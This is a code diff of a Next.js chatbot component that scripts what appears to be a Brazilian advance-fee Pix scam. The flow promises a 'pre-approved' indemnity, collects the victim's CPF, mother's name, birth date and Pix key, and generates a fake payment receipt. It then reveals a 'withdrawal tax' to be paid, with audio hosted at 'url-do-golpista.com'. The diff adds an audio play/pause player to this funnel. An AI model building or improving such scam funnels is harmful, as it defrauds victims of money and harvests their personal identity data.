@@ -4,7 +4,7 @@
 import React, { useState, useEffect, useRef, FC } from 'react';
 import { useRouter } from 'next/navigation';
 import Image from 'next/image';
-import { Loader2, VolumeX, CheckCircle, AlertTriangle, Send, Volume2 } from 'lucide-react';
+import { Loader2, VolumeX, CheckCircle, AlertTriangle, Send, Volume2, Play, Pause } from 'lucide-react';
 
 export interface SimulatedChatParams {
   gclid?: string;
@@ -90,7 +90,6 @@ interface Message {
   text?: string;
   options?: ChatOption[];
 
-  // For 'displayMessage' type steps (now part of Message history)
   isDisplayMessage?: boolean;
   displayTitle?: string;
   displayDetails?: Record<string, string>;
@@ -98,13 +97,11 @@ interface Message {
   audioUrl?: string;
   displayNote?: string;
 
-  // For 'displayDynamicImage' type steps (now part of Message history)
   isDisplayImage?: boolean;
-  imageUrl?: string; // This will be the templateUrl
+  imageUrl?: string; 
   imageAlt?: string;
   imageAiHint?: string;
-  imageMessage?: string; // Introductory text
-  // dataMapping is part of the step definition, not stored per message instance
+  imageMessage?: string; 
 }
 
 
@@ -185,8 +182,7 @@ const funnelDefinition: {
           "Indenização": "{{indenizacaoValor}}",
           "Status": "Pré-aprovado"
         },
-        "audioUrl": "https://media.vocaroo.com/mp3/1aljVYTmQwkb",
-        "note": "[Áudio será reproduzido aqui]"
+        "audioUrl": "https://media.vocaroo.com/mp3/1aljVYTmQwkb"
       },
       "nextStep": "step6_ask_pix_type"
     },
@@ -261,8 +257,7 @@ const funnelDefinition: {
           "Chave Pix": "{{chavePix}}",
           "Status": "Aprovado"
         },
-        "audioUrl": "https://url-do-golpista.com/audios/pix_cadastrado.mp3",
-        "note": "[Áudio será reproduzido aqui]"
+        "audioUrl": "https://url-do-golpista.com/audios/pix_cadastrado.mp3"
       },
       "nextStep": "step10_ask_generate_receipt"
     },
@@ -287,11 +282,11 @@ const funnelDefinition: {
         "imageAiHint": "receipt screenshot",
         "imageAltText": "Comprovante Gerado",
         "dataMapping": [
-          {"variable": "{{userName}}", "x": 120, "y": 235, "font": "Arial", "size": 14, "color": "#333333"},
-          {"variable": "{{userCPF}}", "x": 120, "y": 255, "font": "Arial", "size": 12, "color": "#333333"},
-          {"variable": "{{indenizacaoValor}}", "x": 120, "y": 280, "font": "Arial Bold", "size": 16, "color": "#000000"},
-          {"variable": "{{dataAtual}}", "x": 750, "y": 280, "font": "Arial", "size": 14, "color": "#333333"},
-          {"variable": "{{taxaValor}}", "x": 750, "y": 330, "font": "Arial Bold", "size": 16, "color": "#008000"}
+            {"variable": "{{userName}}", "x": 120, "y": 235, "font": "Arial", "size": 14, "color": "#333333"},
+            {"variable": "{{userCPF}}", "x": 120, "y": 255, "font": "Arial", "size": 12, "color": "#333333"},
+            {"variable": "{{indenizacaoValor}}", "x": 120, "y": 280, "font": "Arial Bold", "size": 16, "color": "#000000"},
+            {"variable": "{{dataAtual}}", "x": 750, "y": 280, "font": "Arial", "size": 14, "color": "#333333"},
+            {"variable": "{{taxaValor}}", "x": 750, "y": 330, "font": "Arial Bold", "size": 16, "color": "#008000"}
         ]
       },
       "nextStep": "step12_reveal_tax_and_audio"
@@ -308,8 +303,7 @@ const funnelDefinition: {
           "Chave Pix": "{{chavePix}}",
           "Imposto de Saque": "{{taxaValor}}"
         },
-        "audioUrl": "https://url-do-golpista.com/audios/explicacao_taxa.mp3",
-        "note": "[Áudio será reproduzido aqui]"
+        "audioUrl": "https://url-do-golpista.com/audios/explicacao_taxa.mp3"
       },
       "nextStep": "step13_final_justification_and_cta"
     },
@@ -359,7 +353,7 @@ const SimulatedChatFlow: FC<{ initialParams: SimulatedChatParams }> = ({ initial
 
   const [isBotTyping, setIsBotTyping] = useState(false);
   const chatEndRef = useRef<HTMLDivElement>(null);
-  const audioRef = useRef<HTMLAudioElement>(null);
+  const audioPlayerRef = useRef<HTMLAudioElement>(null); // Renamed for clarity
   const videoPlayerRef = useRef<HTMLVideoElement>(null);
 
   const [currentVideoData, setCurrentVideoData] = useState<{
@@ -376,6 +370,9 @@ const SimulatedChatFlow: FC<{ initialParams: SimulatedChatParams }> = ({ initial
   const [isTextInputActive, setIsTextInputActive] = useState(false);
   const [currentTextInputConfig, setCurrentTextInputConfig] = useState<FlowStepDataTextInput | null>(null);
   const [textInputValue, setTextInputValue] = useState("");
+
+  const [currentPlayingAudioId, setCurrentPlayingAudioId] = useState<string | null>(null);
+  const [isAudioPlaying, setIsAudioPlaying] = useState(false);
 
   const prevCurrentStepKeyRef = useRef<string>();
   const autoTransitionTimerRef = useRef<NodeJS.Timeout | null>(null);
@@ -444,7 +441,7 @@ const SimulatedChatFlow: FC<{ initialParams: SimulatedChatParams }> = ({ initial
       prevCurrentStepKeyRef.current = undefined;
       justLoadedSessionRef.current = false;
     }
-  }, [initialParams.cpf, initialParams.nome, initialParams.mae, initialParams.nascimento]); // Key dependencies for session logic
+  }, [initialParams.cpf, initialParams.nome, initialParams.mae, initialParams.nascimento]); 
 
   useEffect(() => {
     if (typeof window === 'undefined') return;
@@ -468,7 +465,6 @@ const SimulatedChatFlow: FC<{ initialParams: SimulatedChatParams }> = ({ initial
     if (sessionStorage.getItem(STORAGE_KEY_SESSION_ID) === currentSessionId) {
       const persistableFlowVariables: Record<string, any> = {};
       Object.keys(flowVariables).forEach(key => {
-        // Persist global variables and specifically tracked user-related variables
         if (key in funnelDefinition.globalVariables || ['chavePix', 'userName', 'userCPF', 'userBirthDate', 'userMotherName', 'dataAtual', 'randomMotherName1', 'randomMotherName2'].includes(key)) {
             persistableFlowVariables[key] = flowVariables[key];
         }
@@ -481,14 +477,12 @@ const SimulatedChatFlow: FC<{ initialParams: SimulatedChatParams }> = ({ initial
   const formatText = (text: string | undefined): string => {
     if (!text) return '';
     let formattedText = text;
-    // Ensure flowVariables always has the latest from initialParams if they weren't overridden
     const allVars = {
-        ...(funnelDefinition.globalVariables || {}), // Start with global defaults
-        ...initialParams, // Then initial params from URL
-        ...flowVariables, // Finally, dynamic flow variables (which might have updated initialParams values)
+        ...(funnelDefinition.globalVariables || {}), 
+        ...initialParams, 
+        ...flowVariables, 
     };
 
-    // Specifically ensure these primary user details reflect the latest from flowVariables if set, else initialParams
     allVars.userName = flowVariables.userName || initialParams.nome || 'Usuário';
     allVars.userCPF = flowVariables.userCPF || initialParams.cpf || '---.---.---.--';
     allVars.userBirthDate = flowVariables.userBirthDate || initialParams.nascimento || '--/--/----';
@@ -500,16 +494,15 @@ const SimulatedChatFlow: FC<{ initialParams: SimulatedChatParams }> = ({ initial
       let valueToInsert = String(allVars[key]);
 
       if (valueToInsert !== undefined && valueToInsert !== null && valueToInsert.toLowerCase() !== "null" && valueToInsert.toLowerCase() !== "undefined") {
-        if ((key === 'userCPF' || key === 'chavePix') && valueToInsert.match(/^\d{11}$/)) { // Raw 11-digit CPF
+        if ((key === 'userCPF' || key === 'chavePix') && valueToInsert.match(/^\d{11}$/)) { 
             valueToInsert = valueToInsert.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4');
         } else if ((key === 'userCPF' || key === 'chavePix') && valueToInsert.match(/^\d{3}\.\d{3}\.\d{3}-\d{2}$/)) {
-            // Already formatted
-        } else if (key === 'userBirthDate' && valueToInsert.match(/^\d{4}-\d{2}-\d{2}(T\d{2}:\d{2}:\d{2}(\.\d{3}Z?)?)?$/)) { // ISO Date
+        } else if (key === 'userBirthDate' && valueToInsert.match(/^\d{4}-\d{2}-\d{2}(T\d{2}:\d{2}:\d{2}(\.\d{3}Z?)?)?$/)) { 
             const datePart = valueToInsert.split('T')[0];
             const parts = datePart.split('-');
             if (parts.length === 3) valueToInsert = `${parts[2]}/${parts[1]}/${parts[0]}`;
         }
-        else if ((key === 'userName' || key === 'userMotherName') && valueToInsert && valueToInsert === valueToInsert.toLowerCase()) { // Lowercase name
+        else if ((key === 'userName' || key === 'userMotherName') && valueToInsert && valueToInsert === valueToInsert.toLowerCase()) { 
              valueToInsert = valueToInsert
                 .split(' ')
                 .map(word => word.charAt(0).toUpperCase() + word.slice(1))
@@ -517,7 +510,6 @@ const SimulatedChatFlow: FC<{ initialParams: SimulatedChatParams }> = ({ initial
         }
         formattedText = formattedText.replace(new RegExp(placeholder.replace(/([{}])/g, '\\$1'), 'g'), valueToInsert);
       } else {
-         // Replace with '---' if value is effectively missing
          formattedText = formattedText.replace(new RegExp(placeholder.replace(/([{}])/g, '\\$1'), 'g'), '---');
       }
     }
@@ -538,7 +530,6 @@ const SimulatedChatFlow: FC<{ initialParams: SimulatedChatParams }> = ({ initial
         clearTimeout(autoTransitionTimerRef.current);
         autoTransitionTimerRef.current = null;
     }
-    // Clear transient UI states before navigating
     setCurrentVideoData(null);
     setIsLoadingStep(false);
     setLoadingMessage(null);
@@ -566,7 +557,7 @@ const SimulatedChatFlow: FC<{ initialParams: SimulatedChatParams }> = ({ initial
       return;
     }
 
-    setIsBotTyping(true); // Start typing indicator
+    setIsBotTyping(true);
 
     if (autoTransitionTimerRef.current) {
       clearTimeout(autoTransitionTimerRef.current);
@@ -604,6 +595,7 @@ const SimulatedChatFlow: FC<{ initialParams: SimulatedChatParams }> = ({ initial
                 sender: 'bot',
                 text: formatText(data.message),
                 options: formattedOptions,
+                displayNote: data.note ? formatText(data.note) : undefined,
               };
               const lastMsg = messages[messages.length - 1];
               if (!lastMsg || lastMsg.text !== newBotMessage.text || JSON.stringify(lastMsg.options) !== JSON.stringify(newBotMessage.options)) {
@@ -639,16 +631,11 @@ const SimulatedChatFlow: FC<{ initialParams: SimulatedChatParams }> = ({ initial
                 text: data.message ? formatText(data.message) : undefined,
                 displayDetails: formatDetailsObject(data.details),
                 displayIcon: data.icon,
-                audioUrl: data.audioUrl,
+                audioUrl: data.audioUrl, // Keep audioUrl here for the player
                 displayNote: data.note ? formatText(data.note) : undefined,
               };
               setMessages(prev => [...prev, newBotDisplayMessage]);
               messageAddedInThisStep = true;
-              
-              if (data.audioUrl && audioRef.current) {
-                audioRef.current.src = data.audioUrl;
-                audioRef.current.play().catch(e => console.warn("Audio autoplay failed:", e));
-              }
               break;
             }
             case 'textInput': {
@@ -676,7 +663,7 @@ const SimulatedChatFlow: FC<{ initialParams: SimulatedChatParams }> = ({ initial
                 sender: 'bot',
                 isDisplayImage: true,
                 imageMessage: formatText(data.message) || "Gerando seu comprovante...",
-                imageUrl: data.templateUrl, // This is the base template
+                imageUrl: data.templateUrl, 
                 imageAlt: formatText(data.imageAltText) || "Comprovante",
                 imageAiHint: data.imageAiHint,
               };
@@ -698,19 +685,33 @@ const SimulatedChatFlow: FC<{ initialParams: SimulatedChatParams }> = ({ initial
         let nextStepTransitionDelayMs = stepConfig.type === 'displayMessage' ? 4500 : (stepConfig.type === 'displayDynamicImage' ? 3000 : 0);
         if (stepConfig.type === 'displayMessage') {
             const msgData = stepConfig.data as FlowStepDataDisplayMessage;
-            if (!msgData.details && !msgData.audioUrl) {
-                 nextStepTransitionDelayMs = msgData.message ? 2500 : 1200;
-            } else if (!msgData.details && msgData.audioUrl) {
-                nextStepTransitionDelayMs = 3500;
+            // If it's an audio message, don't auto-transition based on content, let audio finish or user interact.
+            // Only auto-transition non-audio displayMessages.
+            if (!msgData.audioUrl) {
+                if (!msgData.details) {
+                     nextStepTransitionDelayMs = msgData.message ? 2500 : 1200;
+                }
+            } else {
+                // For audio messages, don't auto-transition from here.
+                // Transition will be handled by onEnded or nextStep if audio is not played.
+                // Or, if we want a default timeout if audio isn't played, set it here.
+                // For now, rely on user interaction or manual advancement for audio messages.
+                // To prevent auto-transition for audio, we can set a very long delay or just not set the timer.
+                // Let's keep a default timeout for now, but it might be overridden by audio playback logic.
+                nextStepTransitionDelayMs = 10000; // Example: 10s timeout if audio is not played
             }
         }
 
+
         if (canAutoTransition && (processAsNewStep || (isNewStep && justLoadedSessionRef.current && messageAddedInThisStep))) {
-          autoTransitionTimerRef.current = setTimeout(() => {
-             if (prevCurrentStepKeyRef.current === currentStepKey && currentStepKey === stepConfig.key) {
-               handleUserActionAndNavigate(stepConfig.nextStep as string);
+            const data = stepConfig.data as FlowStepDataDisplayMessage; // Assuming audioUrl is only on displayMessage
+            if (stepConfig.type !== 'displayMessage' || !data.audioUrl) { // Only set auto-transition if not an audio message
+                autoTransitionTimerRef.current = setTimeout(() => {
+                    if (prevCurrentStepKeyRef.current === currentStepKey && currentStepKey === stepConfig.key) {
+                        handleUserActionAndNavigate(stepConfig.nextStep as string);
+                    }
+                }, nextStepTransitionDelayMs);
             }
-          }, nextStepTransitionDelayMs);
         }
       };
       processStepAfterDelayInternal();
@@ -739,6 +740,26 @@ const SimulatedChatFlow: FC<{ initialParams: SimulatedChatParams }> = ({ initial
     chatEndRef.current?.scrollIntoView({ behavior: 'smooth' });
   }, [messages, isLoadingStep, currentVideoData, isTextInputActive, isBotTyping]);
 
+  useEffect(() => {
+    const audio = audioPlayerRef.current;
+    if (audio) {
+      const handleAudioEnded = () => {
+        setIsAudioPlaying(false);
+        setCurrentPlayingAudioId(null);
+        // Auto-navigate to next step if current step was the one playing audio
+        const stepConfig = funnelDefinition.steps[currentStepKey as keyof typeof funnelDefinition.steps];
+        if (stepConfig?.type === 'displayMessage' && (stepConfig.data as FlowStepDataDisplayMessage).audioUrl && stepConfig.nextStep) {
+           if(autoTransitionTimerRef.current) clearTimeout(autoTransitionTimerRef.current); // Clear any generic timer
+           handleUserActionAndNavigate(stepConfig.nextStep);
+        }
+      };
+      audio.addEventListener('ended', handleAudioEnded);
+      return () => {
+        audio.removeEventListener('ended', handleAudioEnded);
+      };
+    }
+  }, [currentStepKey]);
+
 
   const handleOptionClick = (option: ChatOption) => {
     if (option.text === null || typeof option.text === 'undefined') {
@@ -752,7 +773,6 @@ const SimulatedChatFlow: FC<{ initialParams: SimulatedChatParams }> = ({ initial
     setMessages(prevMsgs => {
         const msgsCopy = [...prevMsgs];
         let repliedToBotMessageIndex = -1;
-        // Start from second to last message to find the bot message that was replied to
         for (let i = msgsCopy.length - 2; i >= 0; i--) { 
             if (msgsCopy[i].sender === 'bot' && msgsCopy[i].options && msgsCopy[i].options.length > 0) {
                 repliedToBotMessageIndex = i;
@@ -760,8 +780,6 @@ const SimulatedChatFlow: FC<{ initialParams: SimulatedChatParams }> = ({ initial
             }
         }
         if (repliedToBotMessageIndex !== -1) {
-            // Create a new object for the message to ensure state update,
-            // and set options to undefined for that specific message.
             msgsCopy[repliedToBotMessageIndex] = { ...msgsCopy[repliedToBotMessageIndex], options: undefined };
         }
         return msgsCopy;
@@ -773,6 +791,11 @@ const SimulatedChatFlow: FC<{ initialParams: SimulatedChatParams }> = ({ initial
     setIsTextInputActive(false);
     setCurrentTextInputConfig(null);
     setIsBotTyping(true); 
+    if (isAudioPlaying && audioPlayerRef.current) {
+      audioPlayerRef.current.pause();
+      setIsAudioPlaying(false);
+      setCurrentPlayingAudioId(null);
+    }
 
     if (option.action === 'setChavePixToUserCPF') {
         const cpfToSet = flowVariables.userCPF || "CPF não disponível";
@@ -851,6 +874,24 @@ const SimulatedChatFlow: FC<{ initialParams: SimulatedChatParams }> = ({ initial
     handleUserActionAndNavigate(nextStepKey);
   };
 
+  const handleAudioMessagePlayPause = (msgId: string, audioUrl?: string) => {
+    if (!audioUrl || !audioPlayerRef.current) return;
+
+    if (currentPlayingAudioId === msgId && isAudioPlaying) { // Pause current audio
+      audioPlayerRef.current.pause();
+      setIsAudioPlaying(false);
+    } else { // Play new audio (or resume paused)
+      if (currentPlayingAudioId !== msgId) { // If it's a new audio
+        audioPlayerRef.current.src = audioUrl;
+        setCurrentPlayingAudioId(msgId);
+      }
+      audioPlayerRef.current.play().then(() => {
+        setIsAudioPlaying(true);
+      }).catch(e => console.error("Error playing audio:", e));
+    }
+  };
+
+
   const getIconComponent = (iconName?: string) => {
     if (!iconName) return null;
     if (iconName.includes('success_checkmark')) return <CheckCircle size={20} style={{ color: '#27AE60', marginRight: '8px', verticalAlign: 'bottom', flexShrink: 0 }} />;
@@ -864,7 +905,7 @@ const SimulatedChatFlow: FC<{ initialParams: SimulatedChatParams }> = ({ initial
 
   return (
     <div className="simulated-chat-container" style={{ height: '100%', overflowY: 'auto', display: 'flex', flexDirection: 'column', padding: '10px', backgroundColor: '#f0f0f0' }}>
-      <audio ref={audioRef} style={{ display: 'none' }} />
+      <audio ref={audioPlayerRef} style={{ display: 'none' }} />
 
       {currentVideoData && !isBotTyping && (
         <div className="video-player-section" style={{ marginBottom: '15px', padding: '10px', background: '#fff', borderRadius: '8px', boxShadow: '0 2px 10px rgba(0,0,0,0.1)' }}>
@@ -913,11 +954,11 @@ const SimulatedChatFlow: FC<{ initialParams: SimulatedChatParams }> = ({ initial
       {messages.map((msg) => (
           <div key={msg.id} className={`message-container ${msg.sender === 'bot' ? 'bot-message-container' : 'user-message-container'}`}>
             <div className={`message ${msg.sender === 'bot' ? 'bot-message' : 'user-message'}`}>
-              {msg.text && !msg.isDisplayMessage && !msg.isDisplayImage && (
+              {msg.text && !msg.isDisplayMessage && !msg.isDisplayImage && !msg.audioUrl && (
                 <span style={{whiteSpace: 'pre-line'}} dangerouslySetInnerHTML={{__html: msg.text}} />
               )}
 
-              {msg.isDisplayMessage && (
+              {msg.isDisplayMessage && !msg.audioUrl && (
                 <div className="display-message-content-block">
                   {msg.displayTitle && (
                     <h3 style={{ fontWeight: 'bold', marginBottom: '8px', fontSize: '17px', color: '#0056b3', display: 'flex', alignItems: 'center' }}>
@@ -943,6 +984,34 @@ const SimulatedChatFlow: FC<{ initialParams: SimulatedChatParams }> = ({ initial
                   )}
                 </div>
               )}
+              
+              {msg.audioUrl && msg.sender === 'bot' && (
+                 <div className="audio-message-player">
+                    <button onClick={() => handleAudioMessagePlayPause(msg.id, msg.audioUrl)} className="play-pause-button">
+                        {currentPlayingAudioId === msg.id && isAudioPlaying ? <Pause size={20} /> : <Play size={20} />}
+                    </button>
+                    <div className="audio-message-info">
+                        {msg.displayTitle && <span className="audio-title" dangerouslySetInnerHTML={{ __html: msg.displayTitle }} />}
+                        {msg.text && <span className="audio-text" style={{whiteSpace: 'pre-line'}} dangerouslySetInnerHTML={{__html: msg.text}} />}
+                        <span className="audio-label">Mensagem de Áudio</span>
+                        {/* Simple visual bar, not functional */}
+                        <div className="audio-progress-bar-visual">
+                            <div className="audio-progress-indicator-visual" style={{ width: (currentPlayingAudioId === msg.id && isAudioPlaying) ? '50%' : '0%' }}></div>
+                        </div>
+                    </div>
+                    {msg.displayDetails && (
+                        <div className="details-grid" style={{ borderTop: '1px solid #e0e0e0', paddingTop: '10px', display: 'grid', gridTemplateColumns: 'auto 1fr', gap: '6px 12px', fontSize: '14px', marginTop: '8px' }}>
+                        {Object.entries(msg.displayDetails).map(([key, value]) => (
+                            <React.Fragment key={key}>
+                            <span style={{ fontWeight: '500', color: '#555' }} dangerouslySetInnerHTML={{__html: key}}/>
+                            <span style={{ color: '#333' }} dangerouslySetInnerHTML={{__html: value}}/>
+                            </React.Fragment>
+                        ))}
+                        </div>
+                    )}
+                 </div>
+              )}
+
 
               {msg.isDisplayImage && (
                 <div className="display-image-content-block" style={{ padding: '5px' }}>
@@ -955,7 +1024,7 @@ const SimulatedChatFlow: FC<{ initialParams: SimulatedChatParams }> = ({ initial
                       height={200}
                       data-ai-hint={msg.imageAiHint || "illustration"}
                       style={{ borderRadius: '8px', maxWidth: '100%', height: 'auto', display: 'block' }}
-                      unoptimized // If the image URL is external and might change, or for templates
+                      unoptimized 
                     />
                   )}
                 </div>
@@ -1140,6 +1209,65 @@ const SimulatedChatFlow: FC<{ initialParams: SimulatedChatParams }> = ({ initial
         .display-image-content-block .bot-message {
             width: auto;
             max-width: 100%;
+        }
+        .audio-message-player {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            padding: 8px; /* Reduced padding for a more compact look */
+            min-width: 200px; /* Minimum width */
+        }
+        .play-pause-button {
+            background-color: #007bff; /* Primary blue */
+            color: white;
+            border: none;
+            border-radius: 50%;
+            width: 36px; /* Smaller button */
+            height: 36px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            transition: background-color 0.2s;
+        }
+        .play-pause-button:hover {
+            background-color: #0056b3; /* Darker blue on hover */
+        }
+        .audio-message-info {
+            flex-grow: 1;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+        }
+        .audio-label {
+            font-size: 14px;
+            color: #555; /* Darker grey for better readability */
+            margin-bottom: 4px;
+        }
+        .audio-title {
+            font-weight: bold;
+            font-size: 15px;
+            color: #333;
+            margin-bottom: 2px;
+        }
+        .audio-text {
+            font-size: 14px;
+            color: #444;
+            margin-bottom: 4px;
+        }
+
+        .audio-progress-bar-visual {
+            background-color: #ccc; /* Light grey background for the bar */
+            border-radius: 4px;
+            height: 6px; /* Slimmer bar */
+            width: 100%; /* Full width of its container */
+            overflow: hidden; /* Ensures indicator stays within bounds */
+        }
+        .audio-progress-indicator-visual {
+            background-color: #007bff; /* Blue indicator */
+            height: 100%;
+            border-radius: 4px;
+            transition: width 0.1s linear; /* Smooth transition for visual effect */
         }
       `}</style>
     </div>
